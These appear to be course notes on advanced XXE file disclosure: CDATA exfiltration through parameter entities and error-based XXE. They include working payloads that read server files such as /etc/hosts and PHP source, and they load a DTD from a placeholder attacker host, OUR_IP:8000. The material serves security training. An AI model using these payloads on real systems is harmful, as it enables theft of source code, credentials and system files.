# Advanced File Disclosure (XXE)

## Context
- Basic XXE (previous section) has limits: some files break XML formatting when embedded directly, and in some apps **no entity values are reflected at all**.
- This section covers two advanced techniques: **CDATA exfiltration** (works for any file/framework, not just PHP) and **Error-Based XXE** (for apps with no reflected output).

---

## 1. Advanced Exfiltration with CDATA

### The problem
- Previously, PHP's `php://filter/convert.base64-encode` solved the "file breaks XML" issue — but that's **PHP-specific**.
- For other frameworks, we need a generic way to output **raw/non-XML-safe data** (including binary).

### The idea: CDATA sections
- `<![CDATA[ ... ]]>` tells the XML parser to treat enclosed content as **raw data**, ignoring special characters.
- Goal: wrap the external file's content inside a CDATA block.

### First (failed) attempt
```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```
- **Fails** because XML does not allow joining **internal** and **external general entities** together like this.

### The fix: XML Parameter Entities
- Parameter entities start with `%` and are usable **only within the DTD**.
- Key property: if referenced from an **external source**, all involved entities are treated as external, allowing them to be **joined**.

### Step 1 — Host a DTD file with the join logic
```xml
<!ENTITY joined "%begin;%file;%end;">
```
```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

### Step 2 — Reference the external DTD in the attack payload
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> 
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
...
<email>&joined;</email>
```
- `%begin`, `%file`, `%end` are defined locally as parameter entities.
- `%xxe` pulls in the **externally hosted DTD**, which defines `joined` by referencing `%begin`, `%file`, `%end` — because this join happens via an **externally-loaded DTD**, it's allowed.
- Referencing `&joined;` in the body outputs the file wrapped in CDATA → **raw file content, including special characters**, is returned without breaking XML.

### Result
- Successfully retrieves file content (e.g. `submitDetails.php` source) **without needing base64 encoding** — faster for scanning many files for secrets/passwords.
- **Note:** Some modern web servers block reading certain files (e.g. `index.php`) as a protection against **entity self-reference DoS** (mentioned in the prior section).
- This CDATA + parameter entity technique is **framework-agnostic** — useful when PHP-specific filters don't apply.

## 2. Error-Based XXE

### When to use this
- Some apps **reflect no XML input values at all** → no entity to control for direct output → the basic/CDATA methods (which rely on reflected output) don't work.
- If the app **does show runtime/parsing errors** (e.g. unhandled PHP errors), we can **leak data through error messages** instead.

### Step 1 — Confirm error-based leakage is possible
- Send **malformed XML** (missing closing tag, mismatched tag, or a reference to a **non-existent entity**) to see if the app leaks an error.
- Example result: triggering a `nonExistingEntity` error **revealed the web server's directory path** in the error message — confirms errors are exposed and informative.

### Step 2 — Build a DTD that forces an error containing the file content
Hosted DTD (`xxe.dtd`):
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
- Defines `%file` as the external file to read.
- Defines `%error`, which tries to declare an entity using `%nonExistingEntity;` (which doesn't exist) joined with `%file;`.
- Since `%nonExistingEntity;` is invalid, the parser **throws an error**, and critically, that error message **includes the resolved value of `%file;`** (and other context like a bad URI) — leaking the file content via the error text.
- Other error triggers are possible too: bad URIs, invalid characters in the referenced file, etc.

### Step 3 — Trigger it from the main payload
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```
- No other XML body content is needed — just this DOCTYPE block is sent as the payload.
- Hosting the DTD the same way as before (`python3 -m http.server 8000`).

### Result
- The server's error response includes the content of `/etc/hosts` (in the example).
- To read other files (e.g. source code), just change the file path in the hosted DTD:
  ```xml
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  ```

### Limitations
- **Less reliable** than the CDATA method:
  - May have **length limitations** (error messages often get truncated).
  - Certain **special characters** in the file can still break the technique.

## Summary comparison

| Technique | Use case | Requirement | Reliability |
|---|---|---|---|
| **Basic XXE (file:// / php://filter)** | Reflected output exists | PHP-specific for source code reading | Good, but format-limited |
| **CDATA + Parameter Entities** | Reflected output exists, need raw/binary-safe data, any framework | External DTD hosting, parameter entities | High — framework-agnostic |
| **Error-Based XXE** | No reflected output, but errors are shown | App must expose unhandled XML/parsing errors | Lower — length limits, char restrictions |
| *(Next: fully blind XXE)* | No output, no errors | — | Covered in next section |

## Key takeaways
1. **Parameter entities (`%`)** are the key trick for joining internal and external entity content — only works when loaded via an **externally hosted DTD**.
2. **CDATA wrapping** lets you exfiltrate **any file type/content**, including binary and special characters, without needing framework-specific encoding tricks.
3. When there's **no reflected output at all**, check if the app leaks **parsing/runtime errors** — these can be weaponized to leak file content via a deliberately broken entity reference.
4. Error-based extraction is a **fallback method**, not as clean as CDATA exfiltration, due to size and character limitations.
5. If neither direct reflection nor errors are available, the attack becomes **fully blind XXE** (to be covered next) — typically requiring **out-of-band (OOB)** data exfiltration techniques.
